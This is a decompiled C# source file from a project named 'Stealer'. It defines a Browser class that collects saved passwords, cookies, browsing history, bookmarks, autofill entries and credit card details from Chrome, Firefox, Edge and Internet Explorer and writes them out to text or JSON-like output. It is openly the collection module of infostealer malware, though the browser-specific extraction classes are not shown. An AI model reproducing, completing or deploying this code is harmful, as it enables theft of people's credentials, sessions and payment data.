using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using Stealer.Chromium;
using Stealer.Firefox;
using Stealer.InternetExplorer;

namespace Stealer
{
	// Token: 0x02000008 RID: 8
	internal class Browser
	{
		// Token: 0x0600000D RID: 13 RVA: 0x00002A30 File Offset: 0x00000C30
		public Browser()
		{
			this.Load();
		}

		// Token: 0x0600000E RID: 14 RVA: 0x00002AA0 File Offset: 0x00000CA0
		public static Browser Create(BrowserType _tp)
		{
			switch (_tp)
			{
			case BrowserType.CHROME:
				return new Stealer.Chromium.Recovery();
			case BrowserType.FIREFOX:
				return new Stealer.Firefox.Recovery();
			case BrowserType.IE:
				return new Stealer.InternetExplorer.Recovery();
			}
			return new Browser();
		}

		// Token: 0x0600000F RID: 15 RVA: 0x00002B04 File Offset: 0x00000D04
		public static void SaveAll(string sSavePath)
		{
			foreach (BrowserType browserType in new List<BrowserType>
			{
				BrowserType.CHROME,
				BrowserType.FIREFOX,
				BrowserType.EDGE,
				BrowserType.IE
			})
			{
				Browser.Create(browserType).Save(sSavePath);
			}
		}

		// Token: 0x06000010 RID: 16 RVA: 0x00002B88 File Offset: 0x00000D88
		public static bool GetAllInfo(StringBuilder builder, InfoType _tp)
		{
			bool flag = _tp == InfoType.PASSWORDS || _tp == InfoType.COOKIES;
			if (flag)
			{
				builder.Append("{\n");
			}
			foreach (BrowserType browserType in new List<BrowserType>
			{
				BrowserType.CHROME,
				BrowserType.FIREFOX,
				BrowserType.EDGE,
				BrowserType.IE
			})
			{
				Browser browser = Browser.Create(browserType);
				builder.Append("\"" + browser.type + "\":");
				switch (_tp)
				{
				case InfoType.PASSWORDS:
					browser.GetPasswords(builder);
					break;
				case InfoType.COOKIES:
					browser.GetCookies(builder);
					break;
				case InfoType.HISTORYS:
					browser.GetHistorys(builder);
					break;
				case InfoType.BOOKMARKS:
					browser.GetBookmarks(builder);
					break;
				case InfoType.AUTOFILLS:
					browser.GetAutoFills(builder);
					break;
				case InfoType.CREDITS:
					browser.GetCreditCards(builder);
					break;
				}
				bool flag2 = browserType != BrowserType.IE;
				if (flag2)
				{
					builder.Append(",");
				}
			}
			bool flag3 = _tp == InfoType.PASSWORDS || _tp == InfoType.COOKIES;
			if (flag3)
			{
				builder.Append("}\n");
			}
			return true;
		}

		// Token: 0x06000011 RID: 17 RVA: 0x00002D14 File Offset: 0x00000F14
		protected virtual void Load()
		{
			this.pCreditCards.Clear();
			this.pPasswords.Clear();
			this.pCookies.Clear();
			this.pHistory.Clear();
			this.pAutoFill.Clear();
			this.pBookmarks.Clear();
		}

		// Token: 0x06000012 RID: 18 RVA: 0x00002D70 File Offset: 0x00000F70
		public bool GetPasswords(StringBuilder builder)
		{
			return cBrowserUtils.WritePasswords(this.pPasswords, builder);
		}

		// Token: 0x06000013 RID: 19 RVA: 0x00002D98 File Offset: 0x00000F98
		public bool GetCookies(StringBuilder builder)
		{
			return cBrowserUtils.WriteCookies(this.pCookies, builder);
		}

		// Token: 0x06000014 RID: 20 RVA: 0x00002DC0 File Offset: 0x00000FC0
		public bool GetBookmarks(StringBuilder builder)
		{
			builder.Append("---------------" + this.type + " Bookmarks---------------\r\n");
			return cBrowserUtils.WriteBookmarks(this.pBookmarks, builder);
		}

		// Token: 0x06000015 RID: 21 RVA: 0x00002E04 File Offset: 0x00001004
		public bool GetAutoFills(StringBuilder builder)
		{
			builder.Append("---------------" + this.type + " Autofills---------------\r\n");
			return cBrowserUtils.WriteAutoFill(this.pAutoFill, builder);
		}

		// Token: 0x06000016 RID: 22 RVA: 0x00002E48 File Offset: 0x00001048
		public bool GetHistorys(StringBuilder builder)
		{
			builder.Append("---------------" + this.type + " Histories---------------\r\n");
			return cBrowserUtils.WriteHistory(this.pHistory, builder);
		}

		// Token: 0x06000017 RID: 23 RVA: 0x00002E8C File Offset: 0x0000108C
		public bool GetCreditCards(StringBuilder builder)
		{
			builder.Append("---------------" + this.type + " Credit Cards---------------\r\n");
			return cBrowserUtils.WriteCreditCards(this.pCreditCards, builder);
		}

		// Token: 0x06000018 RID: 24 RVA: 0x00002ED0 File Offset: 0x000010D0
		public void Save(string sSavePath)
		{
			string text = sSavePath + "\\" + this.type + ".txt";
			File.Delete(text);
			StringBuilder stringBuilder = new StringBuilder();
			this.GetPasswords(stringBuilder);
			this.GetCookies(stringBuilder);
			this.GetBookmarks(stringBuilder);
			this.GetAutoFills(stringBuilder);
			this.GetHistorys(stringBuilder);
			this.GetCreditCards(stringBuilder);
		}

		// Token: 0x04000022 RID: 34
		public string type = "";

		// Token: 0x04000023 RID: 35
		public List<CreditCard> pCreditCards = new List<CreditCard>();

		// Token: 0x04000024 RID: 36
		public List<Password> pPasswords = new List<Password>();

		// Token: 0x04000025 RID: 37
		public List<Cookie> pCookies = new List<Cookie>();

		// Token: 0x04000026 RID: 38
		public List<Site> pHistory = new List<Site>();

		// Token: 0x04000027 RID: 39
		public List<AutoFill> pAutoFill = new List<AutoFill>();

		// Token: 0x04000028 RID: 40
		public List<Bookmark> pBookmarks = new List<Bookmark>();
	}
}
